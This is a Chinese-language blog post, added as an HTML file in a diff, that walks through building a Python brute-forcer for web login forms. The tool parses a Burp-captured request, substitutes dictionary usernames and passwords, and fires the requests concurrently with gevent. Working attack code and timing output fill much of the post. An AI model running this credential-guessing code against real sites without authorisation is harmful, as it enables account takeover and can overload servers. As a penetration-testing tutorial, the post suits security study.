@@ -1,0 +1,418 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>web页面密码爆破 | qwrdxer &#39;s blog</title>
+  <meta name="author" content="qwrdxer" />
+
+  
+  <meta name="description" content="一.工具介绍&amp;amp;分析工具使用分析首先带有验证码、以及密码前端加密的登录页面先不做讨论。
+常规的密码爆破为: 
+
+页面输入用户名密码-&amp;gt; burpsuite 抓包-&amp;gt; 标记要爆破的位置-&amp;gt; 导入字典 -&amp;gt; 开始爆破 -&amp;gt; 分析数据包是否爆破成功
+
+​    虽然整个流程大部分都可通过脚本进行实现，但关键的 标记要爆破的位置 却很难实现，这需要去考虑其提交的表单参数中，哪个是用户名，哪个是密码且两者不能颠倒。
+​    因此目前来看，完全的自动化只能处理一部分很“标准化”的登录框，比如页面只有一个表单，且用户名中包含user ,密码中包含password，这种页面通过正则表达式可以很容易实现完全的自动化，awvs都内置这种简单的弱口令自动检测
+
+网上也有大佬编写的现成的工具。
+https://github.com/yzddmr6/WebCrack
+​    但这种方式并不能覆盖全部的网页，较为复杂的网页登录框还是需要人为的进行筛选、标记参数，进行一种半自动化的爆破。
+
+登录框输入固定的标记：如用户名为qwrdxeradmin,密码为qwrdxerpassword，这两个参数固定，且数据包中不能有同样的字段出现。
+抓包，保存
+使用工具匹配到数据包中用户名和密码的位置 ，用字典替换内容，发送数据包
+保存请求和响应的三个关键数据 ： 字典值、状态码、响应数据包大小。" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="web页面密码爆破" />
+  <meta property="og:site_name" content="qwrdxer &#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="qwrdxer &#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">qwrdxer &#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2022-01-11T02:21:34.000Z"><a href="/2022/01/11/自动化脚本&工具开发/web页面密码爆破/">2022-01-11</a></time>
+      
+      
+  
+    <h1 class="title">web页面密码爆破</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="一-工具介绍-amp-分析"><a href="#一-工具介绍-amp-分析" class="headerlink" title="一.工具介绍&amp;分析"></a>一.工具介绍&amp;分析</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先带有验证码、以及密码前端加密的登录页面先不做讨论。</p>
+<p>常规的密码爆破为: </p>
+<blockquote>
+<p>页面输入用户名密码-&gt; burpsuite 抓包-&gt; 标记要爆破的位置-&gt; 导入字典 -&gt; 开始爆破 -&gt; 分析数据包是否爆破成功</p>
+</blockquote>
+<p>​    虽然整个流程大部分都可通过脚本进行实现，但关键的 <strong>标记要爆破的位置</strong> 却很难实现，这需要去考虑其提交的表单参数中，哪个是用户名，哪个是密码且两者不能颠倒。</p>
+<p>​    因此目前来看，完全的自动化只能处理一部分很“标准化”的登录框，比如页面只有一个表单，且用户名中包含user ,密码中包含password，这种页面通过正则表达式可以很容易实现完全的自动化，awvs都内置这种简单的弱口令自动检测</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220111114821463.png" alt="image-20220111114821463"></p>
+<p>网上也有大佬编写的现成的工具。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>​    但这种方式并不能覆盖全部的网页，较为复杂的网页登录框还是需要<strong>人为</strong>的进行筛选、标记参数，进行一种半自动化的爆破。</p>
+<ol>
+<li>登录框输入固定的标记：如用户名为qwrdxeradmin,密码为qwrdxerpassword，这两个参数固定，且数据包中不能有同样的字段出现。</li>
+<li>抓包，保存</li>
+<li>使用工具匹配到数据包中用户名和密码的位置 ，用字典替换内容，发送数据包</li>
+<li>保存请求和响应的三个关键数据 ： 字典值、状态码、响应数据包大小。</li>
+</ol>
+<p><em><span id="more"></span></em> </p>
+<p>​    综上，目前实现的脚本需要实现以下功能：</p>
+<ol>
+<li>爆破用户名 和爆破密码可自定义，默认使用10个常用用户名+3000字典（也就是每个url需要发送30000个数据包)</li>
+<li>如果指定爆破密码或用户名，可选择使用较大的字典。</li>
+<li>对每个请求的响应数据包进行 分析，保留关键数据。</li>
+</ol>
+<h2 id="二-功能实现"><a href="#二-功能实现" class="headerlink" title="二.功能实现"></a>二.功能实现</h2><h3 id="1-数据包的获取"><a href="#1-数据包的获取" class="headerlink" title="1. 数据包的获取"></a>1. 数据包的获取</h3><p>​    因为数据包是在burp中复制的，因此最好能直接解析文本格式的数据包，然后在数据包中用户名或密码位置填入数据，发送数据包。</p>
+<p>​    这篇文章给了一个很好的思路:<a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<ol>
+<li>读入数据包</li>
+<li>在数据包中，第一行有三个重要的信息: 请求的方法(POST / GET  ,一般为POST提交)、请求的目录 、请求的HTTP协议版本，因此对第一行数据可读入请求的类型。</li>
+<li>后续行中，大部分为请求头信息，不做修改直接读入即可。</li>
+<li>POST提交中，最后一行为POST提交的数据，也就是用户名密码 ，我们需要在这里填入字典，重新发送数据。</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/fileadmin/index.php?</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.345.567.123</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=qkivqmbgbiomaum26df44ucsv4</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"></span><br><span class="line">username=admin123&amp;password=admin123</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后分析一下文章中的关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, urllib3</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<span class="comment"># 禁用https协议报错</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sender</span>(<span class="params">content, allowredirect=<span class="literal">True</span></span>):</span></span><br><span class="line">    method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    correct = <span class="literal">True</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lines = content.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">        <span class="keyword">if</span> key == <span class="number">0</span>: <span class="comment"># 第一行数据需要单独处理，获取请求头数据</span></span><br><span class="line">            tmp = line.strip().split()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(tmp) != <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第一行错误 &#x27;</span> + line)</span><br><span class="line">                correct = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            method = tmp[<span class="number">0</span>].lower() <span class="comment"># 这里获取到请求是POST或是GET</span></span><br><span class="line">            url = tmp[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> method == <span class="string">&#x27;post&#x27;</span> <span class="keyword">and</span> key == <span class="built_in">len</span>(lines) - <span class="number">1</span>:<span class="comment"># 最后一行数据为POST提交的数据，进行单独的处理</span></span><br><span class="line">            data = line.strip()</span><br><span class="line">        <span class="keyword">elif</span> line: <span class="comment"># 其他行尾请求头数据，统一处理即可</span></span><br><span class="line">            tmp = line.strip().split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &lt; <span class="number">2</span>:</span><br><span class="line">                correct = <span class="literal">False</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;headers error &#x27;</span> + line)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            tmp[<span class="number">1</span>] = tmp[<span class="number">1</span>].strip()</span><br><span class="line">            headers[tmp[<span class="number">0</span>].lower()] = <span class="string">&#x27;:&#x27;</span>.join(tmp[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> correct:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>):</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + headers.get(<span class="string">&#x27;host&#x27;</span>) + url</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> requests.request(**&#123;</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: data,</span><br><span class="line">            <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">            <span class="string">&#x27;allow_redirects&#x27;</span>: allowredirect,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /fileadmin/index.php? HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 123.345.567.123</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 35</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=qkivqmbgbiomaum26df44ucsv4</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="string">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="string">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="string">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=admin123&amp;password=admin123</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(sender(content).text)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-修改数据包中要爆破的参数-生成payload"><a href="#2-修改数据包中要爆破的参数-生成payload" class="headerlink" title="2.修改数据包中要爆破的参数,生成payload"></a>2.修改数据包中要爆破的参数,生成payload</h3><p>​    文中代码是重新发送数据包，但要爆破密码，需要对数据包中POST提交的数据进行修改。    </p>
+<p>​    因此需要定义一个如下函数，第一个参数为封装好的数据包，第二个参数为POST提交的数据、后续需要对数据进行字典替换、后面两个决定是否爆破用户名或密码。</p>
+<p>​    中间过程为字典替换，发送数据包，记录payload 、响应数据包中状态码、响应数据包长度。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enumerator</span>(<span class="params">package,data,username=<span class="literal">False</span>,password=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="function">	...</span></span><br><span class="line"><span class="function">    <span class="title">return</span> <span class="title">status_code</span> <span class="title">payload</span> <span class="title">length</span></span></span><br></pre></td></tr></table></figure>
+
+<p>​    具体实现代码如下:</p>
+<blockquote>
+<p>字典替换: </p>
+<p>也即是在数据包中最后一行</p>
+<p>username=qwrdxername&amp;password=qwrdxername</p>
+<p>我们要将其中的qwrdxername和qwrdxername 进行字典替换，</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>(<span class="params">usernameandpassowrd=<span class="string">&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;</span></span>):</span></span><br><span class="line">    tmpvar=usernameandpassowrd.split(<span class="string">&quot;&amp;&quot;</span>) <span class="comment">#临时存储用户名和密码</span></span><br><span class="line">    payloadlist=[]</span><br><span class="line">    tmpdic=&#123;&#125;</span><br><span class="line">    user=<span class="string">&quot;&quot;</span></span><br><span class="line">    passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">    payloadtemple=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmpvar:<span class="comment">#在post提交表单中可能有其他数据，因此现将键值对存入字典中，然后将username和passwd提出来</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        tmpdic[i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]]=i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(tmpdic)</span><br><span class="line">    <span class="comment"># 获取到两个表单中的参数名</span></span><br><span class="line">    user=tmpdic[<span class="string">&#x27;qwrdxername&#x27;</span>]</span><br><span class="line">    passwd=tmpdic[<span class="string">&#x27;qwrdxerpasswd&#x27;</span>]</span><br><span class="line">    <span class="keyword">del</span> tmpdic[<span class="string">&#x27;qwrdxername&#x27;</span>]</span><br><span class="line">    <span class="keyword">del</span> tmpdic[<span class="string">&#x27;qwrdxerpasswd&#x27;</span>]</span><br><span class="line">    <span class="comment"># 生成payload</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmpdic.keys():<span class="comment"># 除用户名密码外其他固定参数装入payload中</span></span><br><span class="line">        payloadtemple+=tmpdic[i]+<span class="string">&quot;=&quot;</span>+i+<span class="string">&quot;&amp;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> username <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;dictionary/username.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;UTF-8-sig&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;dictionary/password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;UTF-8-sig&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> payloadtemple!=<span class="string">&quot;&quot;</span>:</span><br><span class="line">                payloadlist.append(payloadtemple+<span class="string">&quot;&amp;&quot;</span>+user+<span class="string">&quot;=&quot;</span>+username.strip()+<span class="string">&quot;&amp;&quot;</span>+passwd+<span class="string">&quot;=&quot;</span>+password.strip())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payloadlist.append(user + <span class="string">&quot;=&quot;</span> + username.strip() + <span class="string">&quot;&amp;&quot;</span> + passwd + <span class="string">&quot;=&quot;</span> + password.strip())</span><br><span class="line">    <span class="keyword">return</span> payloadlist</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-多线程发送数据包"><a href="#3-多线程发送数据包" class="headerlink" title="3.多线程发送数据包"></a>3.多线程发送数据包</h3><p>至此主体已实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    send_request(url,i,headers,method)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url,payload,headers,method</span>):</span></span><br><span class="line">    <span class="comment">#发送数据包</span></span><br><span class="line">    resp=requests.request(**&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">        <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="comment"># &#x27;proxies&#x27;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">print</span>(payload,resp.status_code,<span class="built_in">len</span>(resp.text))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112155302102.png" alt="image-20220112155302102"></p>
+<p>但发送速度过于缓慢，几个用户名+ 千级别字典，一个目标就需要几十分钟乃至几个小时。</p>
+<p>需要对发包进行改进，进行多线程发包。百度翻阅一下，gevent库是个不错的选择</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112165914143.png" alt="image-20220112165914143"></p>
+<p>如下图，使用多线程发送了九个数据包，可见速度提升很大</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112165720892.png" alt="image-20220112165720892"></p>
+<p>发送100个数据包，输出如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用gevent</span><br><span class="line">该循环程序运行时间： 1.4333410263061523</span><br><span class="line"></span><br><span class="line">使用普通for循环</span><br><span class="line">该循环程序运行时间： 78.70576453208923</span><br></pre></td></tr></table></figure>
+
+<p>最初版本核心代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span>  gevent <span class="keyword">import</span>  monkey</span><br><span class="line">monkey.patch_all()  <span class="comment"># 加上这个补丁瞬间变快了 - -</span></span><br><span class="line">url, payloads, headers, method = generate_param(content) <span class="comment">#上文中生成payload的代码</span></span><br><span class="line"></span><br><span class="line">jobs=[]</span><br><span class="line">begin_time = time()</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    jobs.append(gevent.spawn(send_request, url, payload, headers, method))</span><br><span class="line">gevent.joinall(jobs, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url,payload,headers,method</span>):</span></span><br><span class="line">    <span class="comment">#发送数据包</span></span><br><span class="line">    resp=requests.request(**&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">        <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="comment"># &#x27;proxies&#x27;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">print</span>(payload,resp.status_code,<span class="built_in">len</span>(resp.text))</span><br></pre></td></tr></table></figure>
+
+<p>程序获取到payload列表以及其他参数后，使用for循环遍历payloads，为每一个payload分配一个 send_request的job ，然后调用gevent.joinall ，他会自动调用这些job。</p>
+<p>在vps上运行，感觉还不错</p>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112170919713.png" alt="image-20220112170919713"></p>
+<p>然后就是限制一下并发运行数，防止目标宕机。</p>
+<p>百度到了这篇文章，<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>也就是说可以通过gevent.pool 里面的Pool类来实现。</p>
+<p>修改部分代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool<span class="comment">#  导入类</span></span><br><span class="line"></span><br><span class="line">p = Pool(<span class="number">2</span>)  <span class="comment"># 创建一个Pool对象，参数为最大并发的携程数</span></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="comment"># 在添加job时，使用的是p对象</span></span><br><span class="line">    jobs.append(p.spawn(send_request, url, payload, headers, method))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正常启动即可</span></span><br><span class="line">gevent.joinall(jobs, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>测试发包时间如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Pool(<span class="number">2</span>)  <span class="number">2</span>用户名X <span class="number">100</span>密码</span><br><span class="line">该循环程序运行时间： <span class="number">58.2290563583374</span></span><br><span class="line">Pool(<span class="number">5</span>)  <span class="number">2</span>用户名X <span class="number">100</span>密码</span><br><span class="line">该循环程序运行时间： <span class="number">23.66639494895935</span></span><br><span class="line">Pool(<span class="number">10</span>)  <span class="number">2</span>用户名X <span class="number">100</span>密码</span><br><span class="line">该循环程序运行时间： <span class="number">11.918724298477173</span></span><br></pre></td></tr></table></figure>
+
+<p>设置成5~10个左右就可以了</p>
+<h3 id="4-保存结果到文件中"><a href="#4-保存结果到文件中" class="headerlink" title="4. 保存结果到文件中"></a>4. 保存结果到文件中</h3><p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112205300007.png" alt="image-20220112205300007"></p>
+<p>在burpsuite 爆破中，我们主要关注的是Payload 、状态码、响应长度， 因此在代码中要实现的是结果保存、具有排序功能。</p>
+<p>因此可以保存到Excel表格中，方便排序。</p>
+<p><strong>关键点在于: 并发的请求如何写入同一个文件中</strong></p>
+<p>两种思路:</p>
+<p>方法一: 创建一个列表变量存储结果，引入 锁，同一时间只能有一个协程访问该列表</p>
+<p>方法二: 每一个数据包保存为一个文件，在全部请求结束后，单独调用一个函数来将这些文件整合到一起。</p>
+<p>感觉方法一好一点，gevent的锁在gevent.lock里，对发送数据包函数进行 修改如下。</p>
